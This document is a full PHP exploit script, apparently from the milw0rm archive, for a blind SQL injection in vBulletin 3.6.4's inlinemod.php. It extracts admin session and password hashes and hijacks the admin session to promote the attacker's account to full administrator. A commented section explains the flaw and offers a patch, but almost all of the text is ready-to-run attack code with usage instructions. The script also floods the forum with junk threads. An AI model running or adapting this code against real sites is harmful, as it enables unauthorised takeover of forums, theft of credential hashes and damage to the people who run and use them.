<?php
print_r('
-----------------------------------------------------------------------------
vBulletin <= 3.6.4 inlinemod.php "postids" sql injection / privilege
escalation by session hijacking exploit
by rgod
mail: retrog at alice dot it
site: http://retrogod.altervista.org

Works regardless of php.ini settings, you need a Super Moderator account
to copy posts among threads, to be launched while admin is logged in to
the control panel, this will give you full admin privileges
note: this will flood the forum with empty threads even!
-----------------------------------------------------------------------------
');

if ($argc<7) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path user pass forumid postid OPTIONS
host:      target server (ip/hostname)
path:      path to vbulletin
user/pass: you need a moderator account
forumid:   existing forum
postid:    existing post
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /vbulletin/ rgod mypass 2 121 -P1.1.1.1:80
php '.$argv[0].' localhost /vbulletin/ rgod mypass 1 143 -p81
-----------------------------------------------------------------------------
');
die;
}
/*
vulnerable code in inlinemod.php near lines 185-209:

...
	case 'docopyposts':

		$vbulletin->input->clean_array_gpc('p', array(
			'postids' => TYPE_STR,
		));

		$postids = explode(',', $vbulletin->GPC['postids']);
		foreach ($postids AS $index => $postid)
		{
			if ($postids["$index"] != intval($postid))
			{
				unset($postids["$index"]);
			}
		}

		if (empty($postids))
		{
			eval(standard_error(fetch_error('no_applicable_posts_selected')));
		}

		if (count($postids) > $postlimit)
		{
			eval(standard_error(fetch_error('you_are_limited_to_working_with_x_posts', $postlimit)));
		}
		break;
...
when an element of $postids array is not an integer, it fails to unset() the proper value.

An example:

<?php
$foo[1]="99999) UNION SELECT foo FROM foo WHERE foo=1 LIMIT 1/*";
$foo[2]=intval($foo[1]);

echo $foo[1]."\n";
echo $foo[2]."\n";
if ($foo[1] != $foo[2])
{
 echo "they are different";
}
else
{
 echo "they match!";
}
?>

output:

99999) UNION SELECT foo FROM foo WHERE foo=1 LIMIT 1/*
99999
they match!

this because when php tries to comparise a string with an integer
it tries to convert the string in its integer value, it chooses the first integer chars
of the string itself!
so unset() never run!

the result is sql injection near lines 3792-3800:

...
	$posts = $db->query_read_slave("
		SELECT post.postid, post.threadid, post.visible, post.title, post.username, post.dateline, post.parentid, post.userid,
			thread.forumid, thread.title AS thread_title, thread.postuserid, thread.visible AS thread_visible, thread.firstpostid,
			thread.sticky, thread.open, thread.iconid
		FROM " . TABLE_PREFIX . "post AS post
		LEFT JOIN " . TABLE_PREFIX . "thread AS thread USING (threadid)
		WHERE postid IN (" . implode(',', $postids) . ")
		ORDER BY post.dateline
	");
...

this exploit extract various session hashes from the database
to authenticate as admin and to change the privileges of a registered user
I could not find a way to see results inside html, so this asks true/false
questions to the database, copying posts around threads

possible patch, replace:
foreach ($postids AS $index => $postid)
		{
		   	if ($postids["$index"] != intval($postid))
			{
			    unset($postids["$index"]);
			}
		}

with:

foreach ($postids AS $index => $postid)
		{
	       $postids["$index"]=(int)$postids["$index"];
	    }


and, some line before:

foreach ($threadids AS $index => $threadid)
		{
			if ($threadids["$index"] != intval($threadid))
			{
				unset($threadids["$index"]);
			}
		}

with:

foreach ($threadids AS $index => $threadid)
		{
	       $threadids["$index"]=(int)$threadids["$index"];
	    }


vendor was contacted by email form...
*/

error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$user=$argv[3];
$pass=md5($argv[4]);
$forumid=(int)$argv[5];
$existing_post=(int)$argv[6];

$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$data="vb_login_username=$user";
$data.="&vb_login_password=";
$data.="&s=";
$data.="&do=login";
$data.="&vb_login_md5password=$pass";
$data.="&vb_login_md5password_utf=$pass";
$packet="POST ".$p."login.php HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer: http://".$host.$path."login.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$cookie="";
$temp=explode("Set-Cookie: ",$html);
for ($i=1; $i<count($temp); $i++)
{
  $temp2=explode(" ",$temp[$i]);
  $cookie.=" ".trim($temp2[0]);
}
//echo "your cookie -> ".$cookie."\n\n";
if (!eregi("sessionhash",$cookie)){die("failed to login...");}$temp=str_replace(" ","",$cookie);$temp=str_replace("sessionhash","",$temp);
$temp=str_replace("lastvisit","",$temp);$temp=str_replace("lastactivity","",$temp);$temp=explode("=",$temp);$temp=explode(";",$temp[1]);
$cookie_prefix=trim($temp[1]);echo "cookie prefix -> ".$cookie_prefix."\n";

$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers

$j=1;$uid="";
echo "admim user id -> ";
while (!strstr($uid,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
        if (in_array($i,$chars))
        {
          $data ="s=";
          $data.="&do=docopyposts";
          $data.="&destforumid=$forumid";
          $data.="&title=suntzu";
          $data.="&forumid=$forumid";
          $data.="&postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(userid,".$j.",1))=".$i."),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/usergroupid=6/**/LIMIT/**/1/*";
          $packet ="POST ".$p."inlinemod.php?f=$forumid HTTP/1.0\r\n";
          $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
          $packet.="Referer: http://".$host.$path."profile.php\r\n";
          $packet.="Accept-Language: it\r\n";
          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Content-Length: ".strlen($data)."\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Cookie: ".$cookie."; \r\n";
          $packet.="Connection: Close\r\n\r\n";
          $packet.=$data;
          sendpacketii($packet);
          $temp=explode("showthread.php?t=",$html);
          $temp2=explode("\n",$temp[1]);
          $thread=(int)$temp2[0];

          $packet ="GET ".$p."showthread.php?t=$thread HTTP/1.0\r\n";
          $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
          $packet.="Referer: http://".$host.$path."profile.php\r\n";
          $packet.="Accept-Language: it\r\n";
          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Cookie: ".$cookie."; \r\n";
          $packet.="Connection: Close\r\n\r\n";
          sendpacketii($packet);
          if (eregi("You have an error in your SQL syntax",$html)){echo $html; die("\nunknown query error...");}
          if (eregi("join date",$html)) {$uid.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}
if (trim($uid)==""){die("\nExploit failed...");}else{echo "\nvulnerable!";}
$uid=intval($uid);

function my_encode($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}


$j=1;$my_uid="";
echo "\nyour user id -> ";
while (!strstr($my_uid,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
        if (in_array($i,$chars))
        {
          $data ="s=";
          $data.="&do=docopyposts";
          $data.="&destforumid=$forumid";
          $data.="&title=suntzu";
          $data.="&forumid=$forumid";
          $data.="&postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(userid,".$j.",1))=".$i."),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/username=".my_encode($user)."/**/LIMIT/**/1/*";
          $packet ="POST ".$p."inlinemod.php?f=$forumid HTTP/1.0\r\n";
          $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
          $packet.="Referer: http://".$host.$path."profile.php\r\n";
          $packet.="Accept-Language: it\r\n";
          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Content-Length: ".strlen($data)."\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Cookie: ".$cookie."; \r\n";
          $packet.="Connection: Close\r\n\r\n";
          $packet.=$data;
          sendpacketii($packet);
          if (eregi("You have an error in your SQL syntax",$html)){echo $html; die("\nunknown query error...");}
          $temp=explode("showthread.php?t=",$html);
          $temp2=explode("\n",$temp[1]);
          $thread=(int)$temp2[0];

          $packet ="GET ".$p."showthread.php?t=$thread HTTP/1.0\r\n";
          $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
          $packet.="Referer: http://".$host.$path."profile.php\r\n";
          $packet.="Accept-Language: it\r\n";
          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Cookie: ".$cookie."; \r\n";
          $packet.="Connection: Close\r\n\r\n";
          sendpacketii($packet);
          if (eregi("join date",$html)) {$my_uid.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}
$my_uid=intval($my_uid);

$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$chars=array_merge($chars,range(97,102));//a-f letters
$j=1;$sess_hash="";
echo "\nsession hash -> ";
while (!strstr($sess_hash,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
      if (in_array($i,$chars))
        {
          $data ="s=";
          $data.="&do=docopyposts";
          $data.="&destforumid=$forumid";
          $data.="&title=suntzu";
          $data.="&forumid=$forumid";
          $data.="&postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(sessionhash,".$j.",1))=".$i."),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/session/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*";
          $packet ="POST ".$p."inlinemod.php?f=$forumid HTTP/1.0\r\n";
          $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
          $packet.="Referer: http://".$host.$path."profile.php\r\n";
          $packet.="Accept-Language: it\r\n";
          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Content-Length: ".strlen($data)."\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Cookie: ".$cookie."; \r\n";
          $packet.="Connection: Close\r\n\r\n";
          $packet.=$data;
          sendpacketii($packet);
          if (eregi("You have an error in your SQL syntax",$html)){echo $html; die("\nunknown query error...");}
          $temp=explode("showthread.php?t=",$html);
          $temp2=explode("\n",$temp[1]);
          $thread=(int)$temp2[0];

          $packet ="GET ".$p."showthread.php?t=$thread HTTP/1.0\r\n";
          $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
          $packet.="Referer: http://".$host.$path."profile.php\r\n";
          $packet.="Accept-Language: it\r\n";
          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Cookie: ".$cookie."; \r\n";
          $packet.="Connection: Close\r\n\r\n";
          sendpacketii($packet);
          if (eregi("join date",$html)) {$sess_hash.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}

$j=1;$my_hash="";
echo "\nuser password hash -> ";
while (!strstr($my_hash,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
      if (in_array($i,$chars))
        {
          $data ="s=";
          $data.="&do=docopyposts";
          $data.="&destforumid=$forumid";
          $data.="&title=suntzu";
          $data.="&forumid=$forumid";
          $data.="&postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(password,".$j.",1))=".$i."),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*";
          $packet ="POST ".$p."inlinemod.php?f=$forumid HTTP/1.0\r\n";
          $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
          $packet.="Referer: http://".$host.$path."profile.php\r\n";
          $packet.="Accept-Language: en\r\n";
          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Content-Length: ".strlen($data)."\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Cookie: ".$cookie."; \r\n";
          $packet.="Connection: Close\r\n\r\n";
          $packet.=$data;
          sendpacketii($packet);
          if (eregi("You have an error in your SQL syntax",$html)){echo $html; die("\nunknown query error...");}
          $temp=explode("showthread.php?t=",$html);
          $temp2=explode("\n",$temp[1]);
          $thread=(int)$temp2[0];

		  $packet ="GET ".$p."showthread.php?t=$thread HTTP/1.0\r\n";
          $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
          $packet.="Referer: http://".$host.$path."profile.php\r\n";
          $packet.="Accept-Language: en\r\n";
          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Cookie: ".$cookie."; \r\n";
          $packet.="Connection: Close\r\n\r\n";
          sendpacketii($packet);
          if (eregi("join date",$html)) {$my_hash.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}

$j=1;$cpsess_hash="";
echo "\ncp session hash -> ";
while (!strstr($cpsess_hash,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
      if (in_array($i,$chars))
        {
          $data ="s=";
          $data.="&do=docopyposts";
          $data.="&destforumid=$forumid";
          $data.="&title=suntzu";
          $data.="&forumid=$forumid";
          $data.="&postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(hash,".$j.",1))=".$i."),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/cpsession/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*";
          $packet ="POST ".$p."inlinemod.php?f=$forumid HTTP/1.0\r\n";
          $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
          $packet.="Referer: http://".$host.$path."profile.php\r\n";
          $packet.="Accept-Language: en\r\n";
          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Content-Length: ".strlen($data)."\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Cookie: ".$cookie."; \r\n";
          $packet.="Connection: Close\r\n\r\n";
          $packet.=$data;
          sendpacketii($packet);
          $temp=explode("showthread.php?t=",$html);
          $temp2=explode("\n",$temp[1]);
          $thread=(int)$temp2[0];

          $packet ="GET ".$p."showthread.php?t=$thread HTTP/1.0\r\n";
          $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
          $packet.="Referer: http://".$host.$path."profile.php\r\n";
          $packet.="Accept-Language: en\r\n";
          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Cookie: ".$cookie."; \r\n";
          $packet.="Connection: Close\r\n\r\n";
          sendpacketii($packet);
          if (eregi("You have an error in your SQL syntax",$html)){echo $html; die("\nunknown query error...");}
          if (eregi("join date",$html)) {$cpsess_hash.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}
echo "\n";

$packet ="GET ".$p."admincp/user.php?do=edit&u=$my_uid HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer: http://".$host.$path."profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie_prefix."lastactivity=0; ".$cookie_prefix."password=".md5(trim($my_hash))."; bbuserid=".$uid."; ".$cookie_prefix."sessionhash=".trim($sess_hash)."; ".$cookie_prefix."cpsession=".trim($cpsess_hash).";\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp=explode("adminhash\" value=\"",$html);
$temp2=explode("\"",$temp[1]);
$adminhash=$temp2[0];
echo "adminhash ->".$adminhash."\n";
if ($adminhash<>"") {echo "\ndone! you are in... updating ".$user." rights";}
else {die("\nexploit failed...");}

//join to the Administrator group
$my_email="suntzu@suntzu.com";
$data ="do=update";
$data.="&adminhash=$adminhash";
$data.="&quicklinks=user.php%3Fdo%3Deditaccess%26u%3D".$my_uid;
$data.="&user%5Busername%5D=$user";
$data.="&password=";
$data.="&user%5Bemail%5D=$my_email";
$data.="&user%5Blanguageid%5D=0";
$data.="&user%5Busertitle%5D=Admin";
$data.="&user%5Bcustomtitle%5D=0";
$data.="&user%5Bhomepage%5D=";
$data.="&user%5Bbirthday%5D%5Bmonth%5D=0";
$data.="&user%5Bbirthday%5D%5Bday%5D=";
$data.="&user%5Bbirthday%5D%5Byear%5D=";
$data.="&user%5Bshowbirthday%5D=0";
$data.="&user%5Bsignature%5D=";
$data.="&user%5Bicq%5D=";
$data.="&user%5Baim%5D=";
$data.="&user%5Byahoo%5D=";
$data.="&user%5Bmsn%5D=";
$data.="&user%5Bskype%5D=";
$data.="&options%5Bcoppauser%5D=0";
$data.="&user%5Bparentemail%5D=$my_email";
$data.="&user%5Breferrerid%5D=";
$data.="&user%5Bipaddress%5D=";
$data.="&user%5Bposts%5D=0";
$data.="&userfield%5Bfield1%5D=";
$data.="&userfield%5Bfield2%5D=";
$data.="&userfield%5Bfield3%5D=";
$data.="&userfield%5Bfield4%5D=";
$data.="&user%5Busergroupid%5D=6";//primary usergroup, 6=Administrators
$data.="&user%5Bdisplaygroupid%5D=-1";
$data.="&user%5Bmembergroupids%5D%5B%5D=5";//secondary usergroup, 5=Super Moderators
$data.="&options%5Bshowreputation%5D=1";
$data.="&user%5Breputation%5D=10";
$data.="&user%5Bwarnings%5D=0";
$data.="&user%5Binfractions%5D=0";
$data.="&user%5Bipoints%5D=0";
$data.="&options%5Badminemail%5D=1";
$data.="&options%5Bshowemail%5D=0";
$data.="&options%5Binvisible%5D=0";
$data.="&options%5Bshowvcard%5D=0";
$data.="&options%5Breceivepm%5D=1";
$data.="&options%5Breceivepmbuddies%5D=0";
$data.="&options%5Bemailonpm%5D=0";
$data.="&user%5Bpmpopup%5D=0";
$data.="&options%5Bshowsignatures%5D=1";
$data.="&options%5Bshowavatars%5D=1";
$data.="&options%5Bshowimages%5D=1";
$data.="&user%5Bautosubscribe%5D=-1";
$data.="&user%5Bthreadedmode%5D=0";
$data.="&user%5Bshowvbcode%5D=1";
$data.="&user%5Bstyleid%5D=0";
$data.="&adminoptions%5Badminavatar%5D=0";
$data.="&adminoptions%5Badminprofilepic%5D=0";
$data.="&user%5Btimezoneoffset%5D=0";
$data.="&options%5Bdstauto%5D=1";
$data.="&options%5Bdstonoff%5D=0";
$data.="&user%5Bdaysprune%5D=-1";
$data.="&user%5Bjoindate%5D%5Bmonth%5D=2";
$data.="&user%5Bjoindate%5D%5Bday%5D=26";
$data.="&user%5Bjoindate%5D%5Byear%5D=2007";
$data.="&user%5Bjoindate%5D%5Bhour%5D=14";
$data.="&user%5Bjoindate%5D%5Bminute%5D=39";
$data.="&user%5Blastactivity%5D%5Bmonth%5D=2";
$data.="&user%5Blastactivity%5D%5Bday%5D=26";
$data.="&user%5Blastactivity%5D%5Byear%5D=2007";
$data.="&user%5Blastactivity%5D%5Bhour%5D=14";
$data.="&user%5Blastactivity%5D%5Bminute%5D=58";
$data.="&user%5Blastpost%5D%5Bmonth%5D=0";
$data.="&user%5Blastpost%5D%5Bday%5D=";
$data.="&user%5Blastpost%5D%5Byear%5D=";
$data.="&user%5Blastpost%5D%5Bhour%5D=";
$data.="&user%5Blastpost%5D%5Bminute%5D=";
$data.="&userid=".$mu_uid;
$data.="&ousergroupid=";
$data.="&odisplaygroupid=0";
$data.="&userfield%5Bfield1_set%5D=1";
$data.="&userfield%5Bfield2_set%5D=1";
$data.="&userfield%5Bfield3_set%5D=1";
$data.="&userfield%5Bfield4_set%5D=1";
$packet ="POST ".$p."admincp/user.php?do=edit&u=$my_uid HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer: http://".$host.$path."profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie_prefix."lastactivity=0; ".$cookie_prefix."password=".md5(trim($my_hash))."; ".$cookie_prefix."userid=".$uid."; ".$cookie_prefix."sessionhash=".trim($sess_hash)."; ".$cookie_prefix."cpsession=".trim($cpsess_hash).";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);

//now give full rights to the new Administrator
$data ="do=update";
$data.="&adminhash=".$adminhash;
$data.="&adminpermissions%5Bcanadminsettings%5D=1";
$data.="&adminpermissions%5Bcanadminstyles%5D=1";
$data.="&adminpermissions%5Bcanadminlanguages%5D=1";
$data.="&adminpermissions%5Bcanadminforums%5D=1";
$data.="&adminpermissions%5Bcanadminthreads%5D=1";
$data.="&adminpermissions%5Bcanadmincalendars%5D=1";
$data.="&adminpermissions%5Bcanadminusers%5D=1";
$data.="&adminpermissions%5Bcanadminpermissions%5D=1";
$data.="&adminpermissions%5Bcanadminfaq%5D=1";
$data.="&adminpermissions%5Bcanadminimages%5D=1";
$data.="&adminpermissions%5Bcanadminbbcodes%5D=1";
$data.="&adminpermissions%5Bcanadmincron%5D=1";
$data.="&adminpermissions%5Bcanadminmaintain%5D=1";
$data.="&adminpermissions%5Bcanadminplugins%5D=1";
$data.="&cssprefs=";
$data.="&dismissednews=";
$data.="&userid=".$my_uid;
$data.="&oldpermissions=98300";
$data.="&adminpermissions%5Bcanadminupgrade%5D=0";
$packet ="POST ".$p."admincp/adminpermissions.php?do=update HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer: http://".$host.$path."profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie_prefix."lastactivity=0; ".$cookie_prefix."password=".md5(trim($my_hash))."; ".$cookie_prefix."userid=".$uid."; ".$cookie_prefix."sessionhash=".trim($sess_hash)."; ".$cookie_prefix."cpsession=".trim($cpsess_hash).";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
echo "\nnow go to http://".$host.$path."admincp/index.php and login to the control panel...";
?>

# milw0rm.com [2007-02-28]